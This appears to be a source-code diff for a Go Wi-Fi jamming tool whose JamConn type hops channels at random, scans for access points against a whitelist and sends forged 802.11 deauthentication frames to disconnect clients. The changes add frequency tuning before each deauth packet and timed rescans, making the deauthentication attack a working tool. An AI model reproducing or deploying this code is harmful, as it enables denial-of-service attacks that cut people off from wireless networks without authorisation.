@@ -4,6 +4,7 @@ import (
 	"errors"
 	"fmt"
 	"log"
+	"math/rand"
 	"net"
 	"syscall"
 	"time"
@@ -17,18 +18,16 @@ import (
 )
 
 type JamConn		struct {
-	chanInx			int
 	lastChanSwitch	time.Time
-	lastDeauth		time.Time
+	lastAPScan		time.Time
 	nlconn			*genetlink.Conn
 	ifa				*net.Interface
 	fam				*genetlink.Family
 	handle			*pcap.Handle
 }
 
-func  (conn *JamConn)SetLastDeauth(lastDeauth time.Time) {
-
-	conn.lastDeauth = lastDeauth
+func (conn *JamConn) SetLastAPScan(lastAPScan time.Time) {
+	conn.lastAPScan = lastAPScan
 }
 
 func (conn *JamConn) SetLastChanSwitch(lastChanSwitch time.Time) {
@@ -38,7 +37,7 @@ func (conn *JamConn) SetLastChanSwitch(lastChanSwitch time.Time) {
 
 func _NewJamConn(nlconn *genetlink.Conn, ifa *net.Interface, fam *genetlink.Family) *JamConn {
 
-	return &JamConn{chanInx: 1, nlconn: nlconn, ifa: ifa, fam: fam}
+	return &JamConn{nlconn: nlconn, ifa: ifa, fam: fam}
 }
 
 func NewJamConn(ifaName string) (*JamConn, error) {
@@ -63,7 +62,7 @@ func (conn *JamConn) SetDeviceChannel(c int) error {
 	if c < 1 || c > 14 {
 		return errors.New("invalid channel")
 	}
-	chann := ChansG[c - 1]
+	chann := ChanArrG[c - 1]
 	encoder := netlink.NewAttributeEncoder()
 	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
 	encoder.Uint32(nl80211.ATTR_WIPHY_FREQ, chann.CenterFreq)
@@ -87,6 +86,37 @@ func (conn *JamConn) SetDeviceChannel(c int) error {
 	}
 	return nil
 }
+
+func (conn *JamConn) SetDeviceFreq(freq layers.RadioTapChannelFrequency) error {
+
+	chann, ok := ChanMapG[uint16(freq)]
+	if !ok {
+		return errors.New("channel not found")
+	}
+	encoder := netlink.NewAttributeEncoder()
+	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
+	encoder.Uint32(nl80211.ATTR_WIPHY_FREQ, chann.CenterFreq)
+	encoder.Uint32(ATTR_CHANNEL_WIDTH, chann.ChanWidth)
+	encoder.Uint32(ATTR_CENTER_FREQ, chann.CenterFreq)
+	attribs, err := encoder.Encode()
+	if err != nil {
+		return errors.New("genetlink.Encoder.Encode() " + err.Error())
+	}
+	req := genetlink.Message {
+		Header: genetlink.Header {
+			Command: nl80211.CMD_SET_CHANNEL,
+			Version: conn.fam.Version,
+		},
+		Data: attribs,
+	}
+	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
+	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
+	if err != nil {
+		return errors.New("genetlink.Conn.Execute() " + err.Error())
+	}
+	return nil
+}
+
 
 func (conn *JamConn) SendScanAbort() error {
 
@@ -262,41 +292,56 @@ func (conn *JamConn) SetIfaType(ifaType uint32) error {
 	return nil
 }
 
-func (conn *JamConn) DoAPScan(whiteList *List) (macWatch List, err error) {
-
-	scanMCID, err := getNL80211ScanMCID(conn.fam)
+func (conn *JamConn) DoAPScan(whiteList *List, aps *List) (err error) {
+	if err := conn.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
+		return errors.New("JamConn.SetIfaType() " + err.Error())
+	}
+	defer func() {
+		if err := conn.SetIfaType(nl80211.IFTYPE_MONITOR); err != nil {
+			log.Fatalln("JamConn.SetIfaType()", err)
+		}
+	}()
+	scanMCID, err := getDot11ScanMCID(conn.fam)
+	if err != nil {
+		return errors.New("getDot11ScanMCID() " + err.Error())
+	}
 	if err := conn.nlconn.JoinGroup(scanMCID); err != nil {
-		return List{}, errors.New("genetlink.Conn.JoinGroup() " + err.Error())
+		return errors.New("genetlink.Conn.JoinGroup() " + err.Error())
 	}
 	if ok, err := conn.TriggerScan(); !ok {
 		if err.Error() == "scan failed" {
 			//retry scan once
 			if ok, err := conn.TriggerScan(); !ok {
-				return List{}, errors.New("JamConn.TriggerScan() " + err.Error())
+				return errors.New("JamConn.TriggerScan() " + err.Error())
 			}
 		}
-		return List{}, errors.New("JamConn.TriggerScan() " + err.Error())
+		return errors.New("JamConn.TriggerScan() " + err.Error())
 	}
-	stations, err := conn.GetScanResults()
+	results, err := conn.GetScanResults()
 	if err != nil {
-		return List{}, errors.New("JamConn.GetScanResults() " + err.Error())
+		return errors.New("JamConn.GetScanResults() " + err.Error())
 	}
 	if err := conn.nlconn.LeaveGroup(scanMCID); err != nil {
-		return List{}, errors.New("genetlink.LeaveGroup() " + err.Error())
+		return errors.New("genetlink.LeaveGroup() " + err.Error())
 	}
-	return makeApWatchList(stations, whiteList), nil
+	conn.SetLastAPScan(time.Now())
+	appendApWatchList(results, aps, whiteList)
+	return nil
 }
 
 func (conn *JamConn) ChangeChanIfPast(timeout time.Duration) {
 	if time.Since(conn.lastChanSwitch) > timeout {
-		if conn.chanInx + 1 < len(ChansG) - 1 {
-			conn.chanInx += 1
-		} else {
-			conn.chanInx = 1
-		}
-		//TODO refactor
-		_ = conn.SetDeviceChannel(conn.chanInx + 1)
+		inx := randInt(1, len(ChanArrG))
+		_ = conn.SetDeviceChannel(inx)
 		conn.lastChanSwitch = time.Now()
+	}
+}
+
+func (conn *JamConn) DoAPScanIfPast(timeout time.Duration, whiteList *List, aps *List) {
+	if time.Since(conn.lastAPScan) > timeout {
+		if err := conn.DoAPScan(whiteList, aps); err != nil {
+			log.Fatalln("JamConn.DoAPScan() " + err.Error())
+		}
 	}
 }
 
@@ -315,12 +360,18 @@ func (conn *JamConn) ChangeChanIfPast(timeout time.Duration) {
 //	}
 //	return nil
 //}
+func randInt(min int, max int) int {
+	return min + rand.Intn(max-min)
+}
 
 func (conn *JamConn) Deauth(client net.HardwareAddr, ap net.HardwareAddr, tap *layers.RadioTap, dot11Orig *layers.Dot11) error {
 
 	var buff gopacket.SerializeBuffer
 	var opts gopacket.SerializeOptions
 
+	if err := conn.SetDeviceFreq(tap.ChannelFrequency); err != nil {
+		fmt.Println(err)
+	}
 	buff = gopacket.NewSerializeBuffer()
 	opts.ComputeChecksums = true
 	opts.FixLengths = true
@@ -354,6 +405,9 @@ func (conn *JamConn) Deauth(client net.HardwareAddr, ap net.HardwareAddr, tap *l
 		return errors.New("Handle.WritePacketData() " + err.Error())
 	}
 	fmt.Printf("deauthing client %s - from %s\n", client.String(), ap.String())
+	if err := conn.SetDeviceChannel(1); err != nil {
+		fmt.Println(err)
+	}
 	return nil
 }
 
